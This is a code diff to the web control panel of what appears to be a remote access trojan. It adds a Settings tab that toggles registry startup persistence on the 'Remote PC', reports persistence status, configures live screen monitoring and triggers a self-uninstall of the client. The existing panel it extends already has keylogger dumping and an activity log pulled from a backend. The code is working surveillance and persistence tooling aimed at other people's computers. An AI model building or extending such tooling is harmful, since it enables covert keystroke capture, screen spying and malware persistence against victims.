@@ -131,6 +131,7 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     <div class="tab" data-tab="host">HOST</div>
     <div class="tab" data-tab="keylog">KEY</div>
     <div class="tab" data-tab="log">LOG</div>
+    <div class="tab" data-tab="settings">SET</div>
   </div>
 
   <div class="panel active" id="p-cmd">
@@ -316,6 +317,50 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     <div id="logOut" class="scroll-out"><div class="loading">Loading log...</div></div>
     <div id="logErr" class="err"></div>
   </div>
+
+  <div class="panel" id="p-settings">
+    <div class="bar">
+      <span class="lb" style="font-weight:600;color:var(--acc)">Settings</span>
+    </div>
+    <div style="padding:8px 12px">
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
+        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Startup</span>
+        <button class="btn btn-g btn-sm" id="setStartupBtn" onclick="toggleStartup()">...</button>
+        <span id="setStartupTxt" style="font-size:.7rem;color:var(--txt2)">Loading...</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
+        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Persistence</span>
+        <span id="setPersistTxt" style="font-size:.7rem;color:var(--txt2)">Checking...</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
+        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Live Monitor</span>
+        <select class="sel" id="setLiveMon" style="width:60px" onchange="setLiveMon()">
+          <option value="0">M1</option><option value="1">M2</option><option value="2">M3</option><option value="3">M4</option>
+        </select>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
+        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Quality</span>
+        <input type="range" id="setQuality" min="5" max="50" value="25" style="width:100px;accent-color:var(--acc)" oninput="setQVal.textContent=this.value">
+        <span id="setQVal" style="font-size:.7rem;color:var(--txt2);min-width:1.5rem">25</span>
+        <button class="btn btn-g btn-sm" onclick="setLiveQ()">Set</button>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
+        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Scale</span>
+        <select class="sel" id="setScale" style="width:60px">
+          <option value="0.25">25%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1">100%</option>
+        </select>
+        <button class="btn btn-g btn-sm" onclick="setLiveS()">Set</button>
+      </div>
+      <div style="border-top:1px solid rgba(255,255,255,.06);padding-top:12px;margin-top:4px">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
+          <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Remote PC</span>
+          <span id="setPCName" style="font-size:.7rem;color:var(--acc)"></span>
+        </div>
+        <button class="btn btn-d btn-sm" onclick="uninstallClient()" style="font-size:.7rem">Uninstall & Remove</button>
+        <div id="setErr" class="err" style="margin-top:6px"></div>
+      </div>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -343,6 +388,7 @@ function switchTab(name){
   currentTab=name;
   if(name==='files'&&!g_fp)browseDir('');
   if(name==='proc')loadProc();
+  if(name==='settings')loadSettings();
 }
 
 document.addEventListener('keydown',e=>{
@@ -505,6 +551,32 @@ async function dumpKL(){const el=document.getElementById('klOut');const ee=docum
 
 // === Activity Log ===
 async function loadLog(){const el=document.getElementById('logOut');const ee=document.getElementById('logErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity</div>';return}let h='';d.reverse().forEach(e=>{const t=new Date(e.t).toLocaleTimeString();h+='<div style="font-size:.7rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)"><span style="color:var(--txt2)">'+t+'</span> <span style="color:var(--acc)">'+esc(e.type)+'</span> <span>'+esc(e.computer)+'</span> <span style="color:var(--txt2)">'+esc(e.detail||'')+'</span></div>'});el.innerHTML=h}catch(e){el.innerHTML='<div class="loading">Error</div>'}}
+
+// === Settings ===
+document.getElementById('setPCName').textContent=computer;
+async function loadSettings(){
+  const el=document.getElementById('setErr');el.style.display='none';
+  const r=await saw('startup_status','','setErr','setErr');
+  if(r&&r.result){try{const d=JSON.parse(r.result);const btn=document.getElementById('setStartupBtn');const txt=document.getElementById('setStartupTxt');if(d.enabled){btn.textContent='ON';btn.className='btn btn-g btn-sm';btn.style.background='var(--grn)';btn.style.color='#000';txt.textContent=d.active?'Running - will start on boot':'Registry set (path mismatch)';txt.style.color=d.active?'var(--grn)':'var(--ylw)'}else{btn.textContent='OFF';btn.className='btn btn-g btn-sm';btn.style.background='';btn.style.color='';txt.textContent='Not in startup';txt.style.color='var(--txt2)'}}catch{}}
+  const p=document.getElementById('setPersistTxt');
+  p.textContent='Active (pid '+((window._myPid)||'?')+')';p.style.color='var(--grn)';
+}
+async function toggleStartup(){
+  const btn=document.getElementById('setStartupBtn');
+  const isOn=btn.textContent==='ON';
+  const r=await saw(isOn?'startup_off':'startup_on','','setErr','setErr');
+  if(r&&r.result){try{const d=JSON.parse(r.result);const b=document.getElementById('setStartupBtn');const t=document.getElementById('setStartupTxt');if(d.enabled){b.textContent='ON';b.style.background='var(--grn)';b.style.color='#000';t.textContent=d.active?'Running - will start on boot':'Registry set';t.style.color=d.active?'var(--grn)':'var(--ylw)'}else{b.textContent='OFF';b.style.background='';b.style.color='';t.textContent='Not in startup';t.style.color='var(--txt2)'}}catch{}}
+}
+async function uninstallClient(){
+  if(!confirm('UNINSTALL: This will remove the client from the remote PC and delete the exe. Continue?'))return;
+  if(!confirm('Are you REALLY sure? This cannot be undone.'))return;
+  await saw('uninstall','','setErr','setErr');
+  document.getElementById('setErr').textContent='Uninstall command sent - client will remove itself';
+  document.getElementById('setErr').style.display='';
+}
+async function setLiveMon(){const m=document.getElementById('setLiveMon').value;await saw('live_monitor',m,'setErr','setErr')}
+async function setLiveQ(){const q=document.getElementById('setQuality').value;await saw('live_config',JSON.stringify({quality:parseInt(q)}),'setErr','setErr')}
+async function setLiveS(){const s=document.getElementById('setScale').value;await saw('live_config',JSON.stringify({scale:parseFloat(s)}),'setErr','setErr')}
 
 // === Util ===
 function toast(m){const t=document.createElement('div');t.className='toast';t.textContent='✓ '+m;document.body.appendChild(t);setTimeout(()=>t.remove(),1800)}
